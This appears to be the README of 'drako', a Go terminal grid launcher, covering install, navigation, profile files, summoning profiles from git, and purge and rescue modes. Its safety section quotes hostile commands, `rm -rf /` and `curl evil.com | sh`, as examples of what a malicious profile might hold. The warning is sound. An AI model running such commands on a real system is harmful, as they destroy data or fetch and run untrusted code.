![Demo v0.1.8](docs/demo.gif)

The terminal is a realm of immense power, but also of high entropy. Commands are forgotten, workflows fracture, and focus is lost to the noise. **Drako** is a **TUI-Deck launcher** that enables structure, transforming your terminal into a disciplined, grid-based command center. 


## 🚀 Quick Start

> Requires Go **1.24** or newer.

If Go is installed, installing `drako` is a single command.

```bash
go install github.com/lucky7xz/drako@latest
```

### Install Go


- macOS: `brew install go`
- Arch: `sudo pacman -S go`
- Debian/Ubuntu: `sudo apt install golang`
- Windows: `scoop install go` or `winget install GoLang.Go`


Run `drako`. On its first execution, it will construct your configuration file at `~/.config/drako/config.toml` (or `%APPDATA%\drako\config.toml` on Windows). This is the foundation. Modify it to begin bending your workflow into shape. 

### Update

To update `drako` to the latest version, simply run the installation command again.

If you are not getting the latest version, use this command instead:
```bash
GOPROXY=direct go install github.com/lucky7xz/drako/cmd/drako@latest  # install drako
```
NOTE: If go binary directory is not in specified in your path, try `~/./go/bin/drako`

NOTE: If newly added bootstrap profiles do not appear after an update, it is because Drako only attempts to bootstrap if `config.toml` is missing. Even then, it will **not** overwrite existing profile files. To force a full clean-up, use `drako purge --destroyeverything` (or see below for more granular options). Make sure you have backed up your personal work first!

### 🧭 Navigation

- **Grid Navigation:** Use arrows, `w/a/s/d`, or `h/j/k/l`.
- **Quick Nativagion:** For example : Pressing `2` and `3` in sequence moves the cursor to the 2nd column, 3rd row.
- **Switch Profile:** `Alt` + `1-9` to switch directly.
- **Cycle Profile:** `o` (prev) and `p` (next).
- **Profile Inventory:** `i`.
- **Lock:** `r`.
- **Grid/Path Toggle:** `Tab`.
- **Path Mode:**
    - **Search:** `e` (type to filter, arrows to select, esc to cancel).
    - **Hidden Files:** `.` to toggle.
    - **Back:** `q` or `Esc`.
- **Quit:** `Ctrl+C` (Global), or `q` (Grid Mode).

> **Customization:** Remap keys in `~/.config/drako/config.toml` under `[keys]`. You can also disable WASD/Vim bindings there.


### Shell Integration

To enable `cd` on exit, see [docs/SHELL_INTEGRATION.md](docs/SHELL_INTEGRATION.md). 

## ✨ Philosophy

`drako` is built on a few core principles:

-   **The Grid is Your Command Center:** Commands are mapped to a visual grid for immediate access - great for beginners who are just learning the terminal and need to remember a lot of commands, but also power users who want an arsenal of bash scripts at their fingertips, for example.
-   **Profiles are Contexts:** A profile is a complete reconfiguration of the grid. Switch from a "Dev" deck (`go build`, `test`) to an "Ops" deck (`nmap`, `ssh`) instantly.
-   **Portable Configuration:** Your entire setup lives in `~/.config/drako`. Git-manage your own profile folder and `summon` it with `drako summon`. You can deploy your exact control panel to any new machine in an instant.
-   **Harness, Don't Replace:** It integrates with the tools you already use. If it runs in the terminal, it can be bound to the grid.

NOTE: A `deck` is a **subset** of a profile, with at least two commands that 'belong together'. We make this distinction because Profiles might include additional settings, such as themes/ascii art, that are not relevant to the grid. As such, a `deck` can refer to the entire collection of commands in a profile, or just a single cell in the grid, which contains at least two commands that 'belong together'. The grid is technically `3-dimensional` and can fit up to 729 (9x9x9) commands in **PER PROFILE**, any of which can be accessed almost instantly using **Quick Navigation**.


## 👢 Bootstrap & 🧶 The Weaver

On first run, Drako automatically **bootstraps** the default profile inventory, as well as the `Core` profile (a.k.a. `config.toml`) with a layered configuration structure.

```markdown
internal/config/bootstrap/      
├── core_template.toml         # [Template] The skeleton of config.toml
├── core_dictionary.toml       # [Dictionary] OS-specific command mappings
└── inventory/                 # [Profiles] Default profile inventory
```

**The Weaver** ensures cross-platform consistency. Inside the Drako binary lies a **[Core Template](internal/config/bootstrap/core_template.toml)** and a **[dictionary](internal/config/bootstrap/core_dictionary.toml)** of OS-specific defaults. When you run Drako for the first time, The Weaver "weaves" these together to generate a `config.toml` tailored to your operating system (Linux, macOS, or Windows). We also provide a handful of profiles by default, to give you some inspiration (incl. llamacpp, git, etc).

NOTE: If your OS specific dictionary is missing, feel free to create a pull request!


## 📇 Profile Creation Example

Create a new file with the `.profile.toml` extension. `drako` will discover it automatically.

 For example `~/.config/drako/networking.profile.toml`:

```toml
# This profile redefines the grid for security tasks.
x = 3
y = 4

[[commands]]
name = "nmap LAN"
command = "nmap -sn 192.168.1.0/24"
col = a
row = 0
auto_close_execution = false       # Here we want to keep the window open after execution to actaully see the output.

[[commands]]
name = "Bandwidth"
command = "bmon"
col = a
row = 1
# auto-close true per default      # Here we want to close the window after execution because bmon is a TUI.

```

## 🧰 Power Tools

Beyond the TUI, Drako provides CLI commands for advanced management.

### 🪄 Summoning Profiles

Share and reuse command decks across machines and teams. Instead of manually copying profiles, summon them directly from remote sources:

```bash

# Clones the repo and looks for .profile.toml files.
# Discards the temporary repo

drako summon git@github.com:user/my_profile_collection.git
```

Works with any Git host (GitHub, GitLab, self-hosted). Summoned profiles land in your inventory, validated for syntax before copying.

If a profile needs extra files (scripts, configs), declare it under `assets = ["relative/path/to/file", ...]`.
`drako` will copy these assets to `~/.config/drako/assets/<profile_name>/`.

You can then reference them in your commands using their full path. This can be useful when managing multiple ansible playbooks using drako, for example.

### 📚 Profile Specs 

Apply a "spec" to bulk-manage your profiles.
```bash
drako spec example
```
This loads `~/.config/drako/specs/example.spec.toml`. Profiles listed in the spec are **equipped** (moved to visible), and all others are **stored** (moved to `inventory/`). This allows you to switch entire contexts (e.g., "Work Mode" vs "Gaming Mode") in one command.

The reverse of `spec` is `stash`.
```bash
drako stash example
```
Moves the profiles listed in the spec file **into** the inventory (hides them). Useful for clearing a specific set of profiles without affecting others.

## 🗑️ Purge

Safely reset or remove configurations.
```bash
# Reset Core config to defaults (moves old config to trash/)
drako purge --target core

# Remove a specific profile (moves to trash/)
drako purge --target git

# Use interactive mode to purge profiles
drako purge --interactive

# NUCLEAR OPTION: Delete everything in the .config/drako/ folder (NO TRASH, NO UNDO) 💀
drako purge --destroyeverything
```

## 🚑 Rescue Mode

If your configuration breaks (syntax error, invalid grid), Drako won't crash. It enters **Rescue Mode**.

- **Repair Tools:** Provides buttons to edit `config.toml`, open the config directory, or remove broken profiles.
- **Manual Access:** You can enter `[ Rescue Mode ]` manually via the **Inventory** (`i`).
- **Exit:** Select "Exit Rescue Mode" or switch to a working profile (`o`/`p`) to return to normal operation.

## ⚠️ Safety First

- **Summoning is a Trust Operation:** When you summon a profile, you are downloading code that `drako` will execute. A malicious profile could contain harmful commands (e.g., `rm -rf /`, `curl evil.com | sh`).
    - **Review before running:** Always inspect the contents of a summoned profile (using `cat` or your editor) *before* you start using it.
    - **Only summon from trusted sources:** Treat a profile URL like you would a binary executable.
- **Understand the Commands:** Some entries perform system changes (e.g., package updates, Docker operations). Press `e` in the TUI to read the command description.
- **When Unsure:** Consult documentation or ask a trusted friend/colleague.

## Roadmap 

 - [x] Update Bootstrap collection
 - [x] Summon profiles incl assets
 - [x] DRY Refactor  
 - [x] Grid Size Safety & Rescue Mode
 - [x] Core Profile Concept
 - [x] MacOS support (untested)
 - [x] Windows support (untested)
 - [ ] Full unit test suite
 - [ ] Steamdeck support
 - [ ] ARM Support
 - [ ] CI/CD
 - [ ] Auto Update

---

## 🤝 Contribution

Ideas are welcome. Bugs will be hunted.
-   **Issues:** Report defects or propose architectural changes.
-   **Pull Requests:** Fork the repository and submit your work.
-   **Alpha State:** `drako` is currently in (late) ALPHA. It is stable but evolving. This is your opportunity to influence its development.

---

## ❤️ Thanks to Charmbracelet

`drako` uses several Charmbracelet projects to deliver the TUI:

- [`bubbletea`](https://github.com/charmbracelet/bubbletea) for the model/view/update loop
- [`lipgloss`](https://github.com/charmbracelet/lipgloss) for layout and styling
- [`bubbles`](https://github.com/charmbracelet/bubbles) for common components



## 📜 License

The core Drako engine is released under the [GNU Affero General Public License v3.0](LICENSE). Bootstrap assets in the `bootstrap/` directory are released under either [MIT](bootstrap/LICENSE-MIT) or [Apache-2.0](bootstrap/LICENSE-Apache) licenses.

---
<div align="center">

Tame the chaos.

</div>
